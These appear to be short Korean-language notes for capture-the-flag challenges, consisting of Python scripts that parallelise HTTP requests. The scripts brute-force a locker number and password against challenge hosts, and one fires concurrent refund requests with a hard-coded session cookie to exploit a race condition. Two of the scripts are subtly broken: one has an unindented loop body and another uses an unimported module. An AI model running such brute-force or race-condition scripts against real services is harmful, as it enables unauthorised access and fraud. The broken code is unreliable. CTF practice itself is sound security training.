# 멀티스레딩으로 요청 병렬리리
- 기존 코드
```python
import requests
import string
import random


while True:
    a = "x"
    alphanumeric = string.ascii_lowercase + string.digits
    for i in range(3):
        a += str(random.choice(alphanumeric))

    b = 172

    print(a, b)

    url = "http://host3.dreamhack.games:15086/"
    data = {"locker_num": a, "password": b}
    res = requests.post(url=url, data=data)

    if "FLAG" in res.text:
        print(res.text)
        break
```

- 멀티스레드 사용
```python
import threading 
import requests 
def refund(): 
	url = f"http://54.180.98.27:1011/item/refund/cheeese" 
	headers = { "Cookie": "session=eyJpZCI6ImFhYWEifQ.ZUXHtg.rtzL_qMLMrAuQdKr-8vFoTedUYg" } 
	res = requests.get(url=url, headers=headers) 
	print(res.text) 
	
for i in range(10): 
t = threading.Thread(target=refund) 
t.start()
```

```python
import requests
import string
import random
from concurrent.futures import ThreadPoolExecutor

def send_request():
    while True:
        locker_num = "x" + "".join(
            random.choices(string.ascii_lowercase + string.digits, k=3)
        )
        password = 172
        print(locker_num, password)

        url = "http://host3.dreamhack.games:22961/"
        data = {"locker_num": locker_num, "password": password}
        res = requests.post(url=url, data=data)

        if "FLAG" in res.text:
            print(res.text)
            return True

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request) for _ in range(10)]

    for future in concurrent.futures.as_completed(futures):
        if future.result():
            print("FLAG found, terminating other threads.")
            break
```


